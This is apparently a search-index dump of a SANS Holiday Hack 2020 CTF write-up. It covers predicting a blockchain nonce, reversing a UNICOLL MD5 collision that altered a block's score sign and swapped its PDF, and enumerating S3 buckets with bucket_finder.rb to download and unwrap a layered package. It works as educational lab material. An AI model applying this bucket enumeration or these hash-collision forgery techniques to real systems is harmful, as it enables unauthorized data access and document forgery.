nonce value for block 1300000 can be derived from the last two 32 bit values. We need to submit the answer as a hex value Python 3.9.1 (default, Jan 5 2021, 06:37:06) [GCC 5.4.0 20160609] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> hex(4079973021) '0xf32f729d' >>> hex(1460036376) '0x57066318' We get the answer as 57066318f32f729d.","title":"Generating 32 bit nonces from 64 bit nonces"},{"location":"objectives/objective11a/#rejoice","text":"We predicted the nonce value correctly! Answer 57066318f32f729d","title":"Rejoice"},{"location":"objectives/objective11b/","text":"11b) Naughty/Nice List with Blockchain Investigation Part 2 difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 The Objective The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block? Chat with Tinsel Upatree Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. Chat with Tangle Coalbox After helping with the Snowball Game challenge the following conversation ensues. Wow, it really was all about abusing the pseudo-random sequence! I've been thinking, do you think someone could try and cheat the Naughty/Nice Blockchain with this same technique? I remember you told us about how if you have control over to bytes in a file, it's easy to create MD5 hash collisions . But the nonce would have to be known ahead of time. We know that the blockchain works by \"chaining\" blocks together. There's no way you know who could change it without messing up the chain, right Santa? I'm going to look closer to spot if any of the blocks have been changed. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. I think I need to review my Human Behavior Naughty/Niceness curriculum again. Hints Courtesy Tangle Coalbox Blockchain ... Chaining A blockchain works by \"chaining\" blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there's no way that Jack could change an existing block without it messing up the chain... Block Investigation The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there's no way it could happen, maybe if you look at the block that seems like it got changed, it might help. Imposter Block Event Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting. Unique Hash Collision If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Minimal Changes Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. Blockchain Talk Qwerty Petabyte is giving a talk about blockchain tomfoolery! Solution Finding the altered block First let's identify the block Jack has altered. We are given the SHA256 value of this block so maybe we can find the block using this information. I wrote a method within class Chain to dump all the information of blocks in that chain along with the block's SHA256 value. def dump_blocks(self,filename=None): if filename is None: filename = \"all_blocks.txt\" with open(filename,\"w\") as fw: for block in self.blocks: fw.write(repr(block)) hash_obj = SHA256.new() hash_obj.update(block.block_data_signed()) fw.write(\"SHA256: \"+hash_obj.hexdigest()) fw.write(\"\\n\") fw.write(\"------------------------------------------------------------\") So c2.dump_blocks() will write block information along with SHA256 value to a file all_blocks.txt . We can open this file and search for the given SHA256 value to find the altered block. ------------------------------------------------------------Chain Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09' Data item: 2 Data Type: 05 (PDF) Data Length: 00009f57 Data: b'' Date: 03/24 Time: 13:21:41 PreviousHash: 4a91947439046c2dbaa96db38e924665 Data Hash to Sign: 347979fece8d403e06f89f8633b5231a Signature: b'MJIxJy2iFXJRCN1EwDsqO9NzE2Dq1qlvZuFFlljmQ03+erFpqqgSI1xhfAwlfmI2MqZWXA9RDTVw3+aWPq2S0CKuKvXkDOrX92cPUz5wEMYNfuxrpOFhrK2sks0yeQWPsHFEV4cl6jtkZ//OwdIznTuVgfuA8UDcnqCpzSV9Uu8ugZpAlUY43Y40ecJPFoI/xi+VU4xM0+9vjY0EmQijOj5k89/AbMAD2R3UbFNmmR61w7cVLrDhx3XwTdY2RCc3ovnUYmhgPNnduKIUA/zKbuu95FFi5M2r6c5Mt6F+c9EdLza24xX2J4l3YbmagR/AEBaF9EBMDZ1o5cMTMCtHfw==' SHA256: 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f The index of the found block is 12949 and we can save this block to a .dat file using c2.save_a_block(129459-c2.blocks[0].index) What looks fishy? Let's look at the altered block to see if anything seems off. The first odd thing is that this block is a Nice block (sign 1). This seems very curious given all we know about Jack Frost. Also the sign field determines whether the score is positive (sign 0) or negative (sign 1). From our conversation with Tinsel Upatree we came to know that Jack Frost was last seen to have a negative score. All this points to there being something fishy with the sign. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Now let's take a look at the documents attached to this block. From the block information we know that this block has two documents attached to it. We can dump these two docs by using the following commands within the naughty_nice.py script. c2.blocks[129459-c2.blocks[0].index].dump_doc(1) c2.blocks[129459-c2.blocks[0].index].dump_doc(2) We see that a .bin file and .pdf file are attached. Let's see what these contain. Document dumped as: 129459.bin Document dumped as: 129459.pdf 129459.bin seems is binary data that we can't understand. We can read the PDF file which says This document looks fishy indeed. Besides Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block! UNICOLL The below hint seems to point to UNICOLL hash collision. If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision. After reviewing the speakerdeck we understand that UNICOLL is a type of hash collision where two collision blocks(first 20 bytes of the first collision block comprises of prefix) are added to the \"good\" document and just by adding 1 to the 10th byte of the first collision block and subtracting 1 from the 10th byte of the second collision block we can produce a \"bad\" document such that MD5(\"bad\") = MD5(\"good\"). This slide from the speakerdeck illustrates this Now we know that exactly 4 bytes were changed. Since with UNICOLL changes are always made in pairs we can conclude that UNICOLL must have been used twice in this block of the blockchain. UNICOLL to change the sign Let's test our theory about the change in sign. Let's create a copy of the original block.dat, call it block1.dat and edit it as shown below. We can verify that our hopethesis was correct by checking the md5 hash value of block.dat and block1.dat which turn out to be the same! UNICOLL to change the PDF How can a whole document be changed just by changing just two bytes?! Let's find out how.First we need to understand a bit about PDF structure. At a high level every PDF is made up of several objects and objects have references to other objects. A PDF can be visualised as a tree of objects and a PDF is parsed by starting with a root object and following references until the last object is reached. The section in corkami github page highlighting PDF collisions with MD5 is enlightening. These two lines are key The whole document depends on the Root element. storing two document trees in the same file is OK. We just need to make the root object refer to either root object of both documents. After analysing the the PDF (we can open it in any text editor like vi) I found that the PDF has the following structure (simplified) There appear to be two subtrees here! the catalog object or the root object is pointing to object 2 which is the root of of one of the subtrees. Object 3 is unreferenced!Pointing the catalog object to object 3 instead of 2 could potentially render a completely different document! Let's make a copy of block1.dat and call it block2.dat and edit the bytes as shown below. We can verify that our hopethesis was correct by checking the md5 hash value of block.dat and block1.dat which turn out to be the same! Let's find the sha256 value of this document which is theanswer to be submitted Rejoice We found the 4 bytes that were changed and reverted them! One last thing, let's check what the REAL PDF said about Jack Frost. \ud83d\ude31 \ud83d\ude31 \ud83d\ude31 Answer fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"11b) Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"objectives/objective11b/#11b-naughtynice-list-with-blockchain-investigation-part-2","text":"difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"11b) Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"objectives/objective11b/#the-objective","text":"The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?","title":"The Objective"},{"location":"objectives/objective11b/#chat-with-tinsel-upatree","text":"Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk.","title":"Chat with Tinsel Upatree"},{"location":"objectives/objective11b/#chat-with-tangle-coalbox","text":"After helping with the Snowball Game challenge the following conversation ensues. Wow, it really was all about abusing the pseudo-random sequence! I've been thinking, do you think someone could try and cheat the Naughty/Nice Blockchain with this same technique? I remember you told us about how if you have control over to bytes in a file, it's easy to create MD5 hash collisions . But the nonce would have to be known ahead of time. We know that the blockchain works by \"chaining\" blocks together. There's no way you know who could change it without messing up the chain, right Santa? I'm going to look closer to spot if any of the blocks have been changed. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. I think I need to review my Human Behavior Naughty/Niceness curriculum again.","title":"Chat with Tangle Coalbox"},{"location":"objectives/objective11b/#hints-courtesy-tangle-coalbox","text":"","title":"Hints Courtesy Tangle Coalbox"},{"location":"objectives/objective11b/#blockchain-chaining","text":"A blockchain works by \"chaining\" blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there's no way that Jack could change an existing block without it messing up the chain...","title":"Blockchain ... Chaining"},{"location":"objectives/objective11b/#block-investigation","text":"The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there's no way it could happen, maybe if you look at the block that seems like it got changed, it might help.","title":"Block Investigation"},{"location":"objectives/objective11b/#imposter-block-event","text":"Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting.","title":"Imposter Block Event"},{"location":"objectives/objective11b/#unique-hash-collision","text":"If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision .","title":"Unique Hash Collision"},{"location":"objectives/objective11b/#minimal-changes","text":"Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him.","title":"Minimal Changes"},{"location":"objectives/objective11b/#blockchain-talk","text":"Qwerty Petabyte is giving a talk about blockchain tomfoolery!","title":"Blockchain Talk"},{"location":"objectives/objective11b/#solution","text":"","title":"Solution"},{"location":"objectives/objective11b/#finding-the-altered-block","text":"First let's identify the block Jack has altered. We are given the SHA256 value of this block so maybe we can find the block using this information. I wrote a method within class Chain to dump all the information of blocks in that chain along with the block's SHA256 value. def dump_blocks(self,filename=None): if filename is None: filename = \"all_blocks.txt\" with open(filename,\"w\") as fw: for block in self.blocks: fw.write(repr(block)) hash_obj = SHA256.new() hash_obj.update(block.block_data_signed()) fw.write(\"SHA256: \"+hash_obj.hexdigest()) fw.write(\"\\n\") fw.write(\"------------------------------------------------------------\") So c2.dump_blocks() will write block information along with SHA256 value to a file all_blocks.txt . We can open this file and search for the given SHA256 value to find the altered block. ------------------------------------------------------------Chain Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09' Data item: 2 Data Type: 05 (PDF) Data Length: 00009f57 Data: b'' Date: 03/24 Time: 13:21:41 PreviousHash: 4a91947439046c2dbaa96db38e924665 Data Hash to Sign: 347979fece8d403e06f89f8633b5231a Signature: b'MJIxJy2iFXJRCN1EwDsqO9NzE2Dq1qlvZuFFlljmQ03+erFpqqgSI1xhfAwlfmI2MqZWXA9RDTVw3+aWPq2S0CKuKvXkDOrX92cPUz5wEMYNfuxrpOFhrK2sks0yeQWPsHFEV4cl6jtkZ//OwdIznTuVgfuA8UDcnqCpzSV9Uu8ugZpAlUY43Y40ecJPFoI/xi+VU4xM0+9vjY0EmQijOj5k89/AbMAD2R3UbFNmmR61w7cVLrDhx3XwTdY2RCc3ovnUYmhgPNnduKIUA/zKbuu95FFi5M2r6c5Mt6F+c9EdLza24xX2J4l3YbmagR/AEBaF9EBMDZ1o5cMTMCtHfw==' SHA256: 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f The index of the found block is 12949 and we can save this block to a .dat file using c2.save_a_block(129459-c2.blocks[0].index)","title":"Finding the altered block"},{"location":"objectives/objective11b/#what-looks-fishy","text":"Let's look at the altered block to see if anything seems off. The first odd thing is that this block is a Nice block (sign 1). This seems very curious given all we know about Jack Frost. Also the sign field determines whether the score is positive (sign 0) or negative (sign 1). From our conversation with Tinsel Upatree we came to know that Jack Frost was last seen to have a negative score. All this points to there being something fishy with the sign. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Now let's take a look at the documents attached to this block. From the block information we know that this block has two documents attached to it. We can dump these two docs by using the following commands within the naughty_nice.py script. c2.blocks[129459-c2.blocks[0].index].dump_doc(1) c2.blocks[129459-c2.blocks[0].index].dump_doc(2) We see that a .bin file and .pdf file are attached. Let's see what these contain. Document dumped as: 129459.bin Document dumped as: 129459.pdf 129459.bin seems is binary data that we can't understand. We can read the PDF file which says This document looks fishy indeed. Besides Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block!","title":"What looks fishy?"},{"location":"objectives/objective11b/#unicoll","text":"The below hint seems to point to UNICOLL hash collision. If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision. After reviewing the speakerdeck we understand that UNICOLL is a type of hash collision where two collision blocks(first 20 bytes of the first collision block comprises of prefix) are added to the \"good\" document and just by adding 1 to the 10th byte of the first collision block and subtracting 1 from the 10th byte of the second collision block we can produce a \"bad\" document such that MD5(\"bad\") = MD5(\"good\"). This slide from the speakerdeck illustrates this Now we know that exactly 4 bytes were changed. Since with UNICOLL changes are always made in pairs we can conclude that UNICOLL must have been used twice in this block of the blockchain.","title":"UNICOLL"},{"location":"objectives/objective11b/#unicoll-to-change-the-sign","text":"Let's test our theory about the change in sign. Let's create a copy of the original block.dat, call it block1.dat and edit it as shown below. We can verify that our hopethesis was correct by checking the md5 hash value of block.dat and block1.dat which turn out to be the same!","title":"UNICOLL to change the sign"},{"location":"objectives/objective11b/#unicoll-to-change-the-pdf","text":"How can a whole document be changed just by changing just two bytes?! Let's find out how.First we need to understand a bit about PDF structure. At a high level every PDF is made up of several objects and objects have references to other objects. A PDF can be visualised as a tree of objects and a PDF is parsed by starting with a root object and following references until the last object is reached. The section in corkami github page highlighting PDF collisions with MD5 is enlightening. These two lines are key The whole document depends on the Root element. storing two document trees in the same file is OK. We just need to make the root object refer to either root object of both documents. After analysing the the PDF (we can open it in any text editor like vi) I found that the PDF has the following structure (simplified) There appear to be two subtrees here! the catalog object or the root object is pointing to object 2 which is the root of of one of the subtrees. Object 3 is unreferenced!Pointing the catalog object to object 3 instead of 2 could potentially render a completely different document! Let's make a copy of block1.dat and call it block2.dat and edit the bytes as shown below. We can verify that our hopethesis was correct by checking the md5 hash value of block.dat and block1.dat which turn out to be the same! Let's find the sha256 value of this document which is theanswer to be submitted","title":"UNICOLL to change the PDF"},{"location":"objectives/objective11b/#rejoice","text":"We found the 4 bytes that were changed and reverted them! One last thing, let's check what the REAL PDF said about Jack Frost. \ud83d\ude31 \ud83d\ude31 \ud83d\ude31 Answer fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Rejoice"},{"location":"objectives/objective2/","text":"2) Investigate S3 Bucket difficulty \ud83c\udf84 The Objective When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Chat with Shinny Upatree After we help Shinny with the Kringle Kiosk Terminal Challenge the following conversation ensues. Golly - wow! You sure found the flaw for us! Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in! Hints Courtesy Shinny Upatree Find Santa's Package Find Santa's package file from the cloud storage provider. Check Josh Wright's talk for more tips! Leaky AWS S3 Buckets It seems like there's a new story every week about data exposed through unprotected Amazon S3 buckets . Finding S3 Buckets Robin Wood wrote up a guide about finding these open S3 buckets . Bucket_finder.rb He even wrote a tool to search for unprotected buckets ! Santa's Wrapper3000 Santa's Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages. Solution In this challenge we need to find Santa's package file. We understand that this file is stored in an Amazon S3 bucket. To access Santa's package we would need to know the S3 bucket name and what's more we would need to have permissions to access the bucket contents. Hey but data exposed through unprotected S3 buckets is not uncommon so we could get lucky and get around permissions. Finding the S3 bucket On terminal start-up we are greeted with the following MOTD.The word \"Wrapper3000\" has been highlighted in green so this must be relevant. Could this maybe be the name of the bucket? The hints highlighted in red seem to deal with unwrapping the package file once we find it. On listing directory contents we find the program bucket_finder.rb and this is the tool we will use to find unprotected s3 buckets. usage: ./bucket_finder.rb wordlist All we need to do is specify a wordlist and the tool checks each word to see if that bucket name exists in the Amazon's S3 system. Any that it finds it will check to see if the bucket is public, private or a redirect. Let's first run the tool with the default wordlist given to us elf@f749b6bdc8c1:~/bucket_finder$ ls -l total 20 -rw-r--r-- 1 elf elf 2550 Dec 5 00:00 README -rwxr-xr-x 1 elf elf 9121 Dec 17 13:08 bucket_finder.rb -rw-r--r-- 1 elf elf 28 Dec 5 00:00 wordlist elf@f749b6bdc8c1:~/bucket_finder$ cat wordlist kringlecastle wrapper santa elf@f749b6bdc8c1:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa The output tells us that while all these buckets exist, we don't have access to any of them \ud83d\ude1e Let's add our guess \"wrapper3000\" to the wordlist and try the program again. (Note the lower case \"w\", Amazon S3 bucket names have certain restrictions and must adhere to certain rules one of which states that Bucket names can consist only of lowercase letters, numbers, dots (.), and hyphens (-).) elf@f749b6bdc8c1:~/bucket_finder$ echo \"wrapper3000\" >> wordlist elf@f749b6bdc8c1:~/bucket_finder$ cat wordlist kringlecastle wrapper santa wrapper3000 elf@f749b6bdc8c1:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Public> http://s3.amazonaws.com/wrapper3000/package And Voila we have access to this bucket and the program conveniently spits out the URL to the public package file inside the bucket. Let's download the file. elf@f749b6bdc8c1:~/bucket_finder$ curl http://s3.amazonaws.com/wrapper3000/package > package % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 829 100 829 0 0 9987 0 --:--:-- --:--:-- --:--:-- 9987 elf@f749b6bdc8c1:~/bucket_finder$ ls README bucket_finder.rb package wordlist Unwrapping the Package File Take another look at the MOTD for some hints on unwrapping. Three commands are suggested file to identify a file type man to get more information on a command apropos to search man pages Let's inspect this file by using the file command and cat command elf@f749b6bdc8c1:~/bucket_finder$ file package package: ASCII text, with very long lines elf@ee259b7eb5a8:~/bucket_finder$ cat package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA This looks like some encoded data. Let's use CyberChef tool with the Magic recipe to decode this. Cyberchef detects the data as base64 encoded and decodes it. It detects that the decoded data is a zip archive and proceeds to extract the following file from the archive. package.txt.Z.xz.xxd.tar.bz2 It further detects that the extracted file is bz2 compressed data and proceeds to uncompress it. It detects the uncompressed data as a tar By default the depth is 3 but by increasing the depth, CyberChef is able to unravel many more layers of the file. However CyberChef doesn't seem able to decode beyond a certain point (It isn't able to proceed past package.txt.Z.xz ). Let's try this process on linux terminal. We would use file command to detect the file type and find out the matching operation for this file type (either by a google search or using the apropos or man command). Below is a visualisation of the \"wrapping\" and \"unwrapping\" process along with matching commands. Finally we can apply the operation to \"unwrap\" one layer of the file. The code below shows the entire process. elf@bf22ef953c26:~/bucket_finder$ file package package: ASCII text, with very long lines elf@bf22ef953c26:~/bucket_finder$ base64 -d package > package.zip elf@bf22ef953c26:~/bucket_finder$ file package.zip package.zip: Zip archive data, at least v1.0 to extract elf@bf22ef953c26:~/bucket_finder$ unzip package.zip Archive: package.zip extracting: package.txt.Z.xz.xxd.tar.bz2 elf@bf22ef953c26:~/bucket_finder$ file package.txt.Z.xz.xxd.tar.bz2 package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k elf@bf22ef953c26:~/bucket_finder$ bunzip2 package.txt.Z.xz.xxd.tar.bz2 elf@bf22ef953c26:~/bucket_finder$ file package.txt.Z.xz.xxd.tar package.txt.Z.xz.xxd.tar: POSIX tar archive elf@bf22ef953c26:~/bucket_finder$ tar -xvf package.txt.Z.xz.xxd.tar package.txt.Z.xz.xxd elf@bf22ef953c26:~/bucket_finder$ file package.txt.Z.xz.xxd package.txt.Z.xz.xxd: ASCII text elf@bf22ef953c26:~/bucket_finder$ xxd -r package.txt.Z.xz.xxd > pack.xz elf@bf22ef953c26:~/bucket_finder$ file pack.xz pack.xz: XZ compressed data elf@bf22ef953c26:~/bucket_finder$ unxz pack.xz elf@bf22ef953c26:~/bucket_finder$ file pack pack: compress'd data 16 bits elf@bf22ef953c26:~/bucket_finder$ uncompress pack gzip: pack: unknown suffix -- ignored elf@bf22ef953c26:~/bucket_finder$ mv pack pack.gz elf@bf22ef953c26:~/bucket_finder$ uncompress pack.gz elf@bf22ef953c26:~/bucket_finder$ file pack pack: ASCII text elf@bf22ef953c26:~/bucket_finder$ cat pack North Pole: The Frostiest Place on Earth Rejoice We successfully unwrapped Santa's super over-wrapped package! Answer North Pole: The Frostiest Place on Earth","title":"2) Investigate S3 Bucket"},{"location":"objectives/objective2/#2-investigate-s3-bucket","text":"difficulty \ud83c\udf84","title":"2) Investigate S3 Bucket"},{"location":"objectives/objective2/#the-objective","text":"When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.","title":"The Objective"},{"location":"objectives/objective2/#chat-with-shinny-upatree","text":"After we help Shinny with the Kringle Kiosk Terminal Challenge the following conversation ensues. Golly - wow! You sure found the flaw for us! Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in!","title":"Chat with Shinny Upatree"},{"location":"objectives/objective2/#hints-courtesy-shinny-upatree","text":"","title":"Hints Courtesy Shinny Upatree"},{"location":"objectives/objective2/#find-santas-package","text":"Find Santa's package file from the cloud storage provider. Check Josh Wright's talk for more tips!","title":"Find Santa's Package"},{"location":"objectives/objective2/#leaky-aws-s3-buckets","text":"It seems like there's a new story every week about data exposed through unprotected Amazon S3 buckets .","title":"Leaky AWS S3 Buckets"},{"location":"objectives/objective2/#finding-s3-buckets","text":"Robin Wood wrote up a guide about finding these open S3 buckets .","title":"Finding S3 Buckets"},{"location":"objectives/objective2/#bucket_finderrb","text":"He even wrote a tool to search for unprotected buckets !","title":"Bucket_finder.rb"},{"location":"objectives/objective2/#santas-wrapper3000","text":"Santa's Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages.","title":"Santa's Wrapper3000"},{"location":"objectives/objective2/#solution","text":"In this challenge we need to find Santa's package file. We understand that this file is stored in an Amazon S3 bucket. To access Santa's package we would need to know the S3 bucket name and what's more we would need to have permissions to access the bucket contents. Hey but data exposed through unprotected S3 buckets is not uncommon so we could get lucky and get around permissions.","title":"Solution"},{"location":"objectives/objective2/#finding-the-s3-bucket","text":"On terminal start-up we are greeted with the following MOTD.The word \"Wrapper3000\" has been highlighted in green so this must be relevant. Could this maybe be the name of the bucket? The hints highlighted in red seem to deal with unwrapping the package file once we find it. On listing directory contents we find the program bucket_finder.rb and this is the tool we will use to find unprotected s3 buckets. usage: ./bucket_finder.rb wordlist All we need to do is specify a wordlist and the tool checks each word to see if that bucket name exists in the Amazon's S3 system. Any that it finds it will check to see if the bucket is public, private or a redirect. Let's first run the tool with the default wordlist given to us elf@f749b6bdc8c1:~/bucket_finder$ ls -l total 20 -rw-r--r-- 1 elf elf 2550 Dec 5 00:00 README -rwxr-xr-x 1 elf elf 9121 Dec 17 13:08 bucket_finder.rb -rw-r--r-- 1 elf elf 28 Dec 5 00:00 wordlist elf@f749b6bdc8c1:~/bucket_finder$ cat wordlist kringlecastle wrapper santa elf@f749b6bdc8c1:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa The output tells us that while all these buckets exist, we don't have access to any of them \ud83d\ude1e Let's add our guess \"wrapper3000\" to the wordlist and try the program again. (Note the lower case \"w\", Amazon S3 bucket names have certain restrictions and must adhere to certain rules one of which states that Bucket names can consist only of lowercase letters, numbers, dots (.), and hyphens (-).) elf@f749b6bdc8c1:~/bucket_finder$ echo \"wrapper3000\" >> wordlist elf@f749b6bdc8c1:~/bucket_finder$ cat wordlist kringlecastle wrapper santa wrapper3000 elf@f749b6bdc8c1:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Public> http://s3.amazonaws.com/wrapper3000/package And Voila we have access to this 